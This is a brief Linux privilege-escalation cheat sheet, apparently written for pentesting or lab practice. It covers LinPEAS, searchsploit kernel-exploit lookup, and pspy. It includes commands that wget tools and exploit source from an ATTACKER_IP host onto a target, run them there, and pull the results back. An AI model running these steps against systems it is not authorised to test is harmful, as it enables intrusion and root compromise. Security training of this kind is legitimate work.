# Linux PrivEsc — Automation & Exploits

## 1. LinPEAS

**Host on attacker:**

```bash
python3 -m http.server 8000
```

**Download and run on target:**

```bash
wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a | tee /tmp/linpeas.txt
```

**Retrieve output:**

Target:

```bash
cd /tmp && python3 -m http.server 8001
```

Attacker:

```bash
wget http://TARGET_IP:8001/linpeas.txt
```

## 2. Public / Kernel Exploits

**Identify and search:**

```bash
uname -a
uname -m
cat /etc/os-release
searchsploit linux kernel VERSION
searchsploit --cve CVE-ID
```

**Transfer exploit to target:**

```bash
# Attacker
python3 -m http.server 8000

# Target
wget http://ATTACKER_IP:8000/exploit.c -O /tmp/exploit.c
```

**Compile on target (if GCC exists):**

```bash
gcc /tmp/exploit.c -o /tmp/exploit
```

**No GCC?** Compile on the attacker with a compatible toolchain:

```bash
gcc exploit.c -o exploit -static
```

Check architecture with `uname -m` and the binary with `file exploit`. Kernel exploits can crash the system; verify the CVE, version, architecture, and requirements first.

## 3. pspy — Process Monitoring

Find short-lived processes and hidden scheduled tasks without root.

```bash
./pspy64 -pf -i 1000
```

- `-p` → Print commands
    
- `-f` → Show filesystem events
    
- `-i 1000` → 1-second interval
    

Let it run for **5–10 minutes** to catch scheduled jobs. Look for root (`UID=0`) processes executing scripts or binaries your user can modify.

## Workflow

**Run LinPEAS → Investigate findings → Monitor with pspy → Research CVEs → Verify safely.**
